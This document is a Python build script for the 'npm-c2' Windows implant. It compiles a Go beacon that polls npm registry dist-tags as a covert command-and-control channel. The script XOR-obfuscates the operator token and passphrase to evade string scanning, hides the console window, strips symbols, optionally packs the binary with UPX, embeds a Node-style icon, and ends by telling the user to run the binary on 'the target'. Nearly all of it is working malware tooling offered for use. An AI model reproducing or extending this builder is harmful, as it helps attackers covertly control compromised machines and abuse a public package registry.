#!/usr/bin/env python3
"""Build the Windows implant from config.json (or from CLI overrides).

    cp config.example.json config.json
    python3 build.py

Everything the binary needs is baked in: registry, package, token, channel,
passphrase and poll timing. The token and the passphrase are XOR-obfuscated, so
strings(1) does not reveal either. Output goes to dist/.
"""
from __future__ import annotations

import argparse
import json
import os
import re
import shutil
import subprocess
import sys

ROOT = os.path.dirname(os.path.abspath(__file__))
GO_DIR = os.path.join(ROOT, "implant")
RES_DIR = os.path.join(GO_DIR, "resource")
ICON = os.path.join(ROOT, "assets", "node.ico")
RC = os.path.join(RES_DIR, "node.rc")
DIST = os.path.join(ROOT, "dist")
sys.path.insert(0, os.path.join(ROOT, "src"))

DEFAULTS = {
    "package": "",
    "token": "",
    "channel": "c0ff",
    "passphrase": "",
    "interval": 60,
    "jitter": 20,
    "registry": None,
    "arch": "amd64",
    "name": "node",
    "upx": False,
    "strip": True,
    "tag_value": "1.0.0",
}

ARCH = {
    "amd64": {"goarch": "amd64", "windres": "x86_64-w64-mingw32-windres",
              "syso": "rsrc_windows_amd64.syso", "suffix": ""},
    "386": {"goarch": "386", "windres": "i686-w64-mingw32-windres",
            "syso": "rsrc_windows_386.syso", "suffix": "-x86"},
}


def log(msg):
    print(msg, flush=True)


def load_config(path):
    if not os.path.exists(path):
        raise SystemExit(f"no {os.path.basename(path)}: copy config.example.json")
    with open(path, encoding="utf-8") as f:
        try:
            raw = json.load(f)
        except json.JSONDecodeError as e:
            raise SystemExit(f"{path}: invalid JSON: {e}")
    cfg = dict(DEFAULTS)
    cfg.update({k: v for k, v in raw.items() if not k.startswith("_")})
    return cfg


def validate(cfg):
    if not cfg["package"]:
        raise SystemExit("config.json: 'package' is required")
    if not cfg["token"]:
        raise SystemExit("config.json: 'token' is required (GET /-/stage needs it)")
    if not re.fullmatch(r"[a-f][0-9a-f]{3}", cfg["channel"]):
        raise SystemExit("config.json: 'channel' must be 4 chars, first one a-f")
    if cfg["arch"] not in ("amd64", "386", "x86", "both"):
        raise SystemExit("config.json: 'arch' must be amd64, 386 or both")
    if shutil.which("go") is None:
        raise SystemExit("Go 1.21+ not found: install it from go.dev")


def make_resources(arch_key):
    cfg = ARCH[arch_key]
    syso = os.path.join(RES_DIR, cfg["syso"])
    windres = shutil.which(cfg["windres"])
    if windres is None:
        # Hosts without mingw (native Windows, minimal CI images) use the
        # compiled resource that is checked in with the Go module.
        if os.path.exists(syso):
            shutil.copy2(syso, os.path.join(GO_DIR, cfg["syso"]))
            log(f"[+] prebuilt resource ({arch_key})")
            return
        raise SystemExit(f"missing {cfg['windres']}: apt install gcc-mingw-w64")
    shutil.copy2(ICON, os.path.join(RES_DIR, "node.ico"))
    subprocess.run([windres, "-I", RES_DIR, RC, "-O", "coff", "-o", syso],
                   check=True)
    # go build only picks up a .syso at the package root
    shutil.copy2(syso, os.path.join(GO_DIR, cfg["syso"]))


def pack_upx(path):
    upx = shutil.which("upx")
    if upx is None:
        return None
    before = os.path.getsize(path)
    p = subprocess.run([upx, "--best", "--lzma", "-q", path],
                       capture_output=True, text=True)
    if p.returncode != 0:
        sys.stderr.write(f"[!] upx failed: {p.stderr[-400:]}\n")
        return None
    return before, os.path.getsize(path)


def build(cfg, arch_key):
    from npm_c2 import obfuscate_token
    from npm_c2.crypto import obfuscate_secret

    a = ARCH[arch_key]
    api_tmpl = (cfg["registry"] or "https://registry.npmjs.org") + "/-/package/%s/dist-tags"
    emb = obfuscate_token(cfg["token"], cfg["package"])
    emb_key = obfuscate_secret(cfg["passphrase"], cfg["package"]) if cfg["passphrase"] else ""

    make_resources(arch_key)
    os.makedirs(DIST, exist_ok=True)
    target = os.path.join(DIST, f"{cfg['name']}{a['suffix']}.exe")

    ldflags = [
        "-X", f"main.apiTemplate={api_tmpl}",
        "-X", f"main.embeddedToken={emb}",
        "-X", f"main.embeddedPkg={cfg['package']}",
        "-X", f"main.embeddedEvery={int(cfg['interval'])}",
        "-X", f"main.embeddedJit={int(cfg['jitter'])}",
        "-X", f"main.tagValue={cfg['tag_value']}",
        "-X", f"main.embeddedKey={emb_key}",
        "-X", f"main.embeddedStageChan={cfg['channel']}",
        "-X", "main.embeddedStageMode=1",
        "-H", "windowsgui",
    ]
    if cfg["strip"]:
        ldflags = ["-s", "-w"] + ldflags

    cmd = ["go", "build", "-trimpath", "-ldflags", " ".join(ldflags),
           "-o", target, "."]
    env = dict(os.environ, CGO_ENABLED="0", GOOS="windows", GOARCH=a["goarch"])
    log(f"[+] go build {a['goarch']} -> {target}")
    p = subprocess.run(cmd, cwd=GO_DIR, env=env, capture_output=True, text=True)
    syso = os.path.join(GO_DIR, a["syso"])
    if os.path.exists(syso):
        os.remove(syso)
    if p.returncode != 0:
        sys.stderr.write((p.stdout or "")[-3000:] + (p.stderr or "")[-3000:])
        raise SystemExit("go build failed")
    if not os.path.exists(target):
        raise SystemExit(f"go build reported success but {target} is missing")

    if cfg["upx"]:
        packed = pack_upx(target)
        if packed:
            log(f"[+] upx: {packed[0]:,} -> {packed[1]:,} bytes")
        else:
            log("[!] upx not found: leaving the binary unpacked")
    log(f"[+] {target} ({os.path.getsize(target):,} bytes)")
    return target


def main():
    ap = argparse.ArgumentParser(description="Build the npm-c2 Windows implant")
    ap.add_argument("--config", default=os.path.join(ROOT, "config.json"))
    ap.add_argument("--package", "-p")
    ap.add_argument("--token", "-t")
    ap.add_argument("--channel", "-c")
    ap.add_argument("--passphrase")
    ap.add_argument("--interval", type=int)
    ap.add_argument("--jitter", type=int)
    ap.add_argument("--api-base", dest="registry")
    ap.add_argument("--arch", choices=("amd64", "386", "x86", "both"))
    ap.add_argument("--name")
    ap.add_argument("--32", dest="arch32", action="store_true")
    ap.add_argument("--upx", action="store_true")
    ap.add_argument("--no-strip", action="store_true")
    ap.add_argument("--tag-value")
    a = ap.parse_args()

    cfg = load_config(a.config)
    for key in ("package", "token", "channel", "passphrase", "interval",
                "jitter", "registry", "arch", "name", "tag_value"):
        value = getattr(a, key, None)
        if value is not None:
            cfg[key] = value
    if a.upx:
        cfg["upx"] = True
    if a.no_strip:
        cfg["strip"] = False
    if a.arch32:
        cfg["arch"] = "both"
    validate(cfg)

    if cfg["arch"] == "both":
        arches = ["amd64", "386"]
    elif cfg["arch"] in ("386", "x86"):
        arches = ["386"]
    else:
        arches = ["amd64"]
    log(f"[*] package={cfg['package']} channel={cfg['channel']} "
        f"interval={cfg['interval']}s jitter={cfg['jitter']}s arch={cfg['arch']}")
    for arch in arches:
        build(cfg, arch)
    log("[+] run it with no arguments on the target")
    return 0


if __name__ == "__main__":
    sys.exit(main())
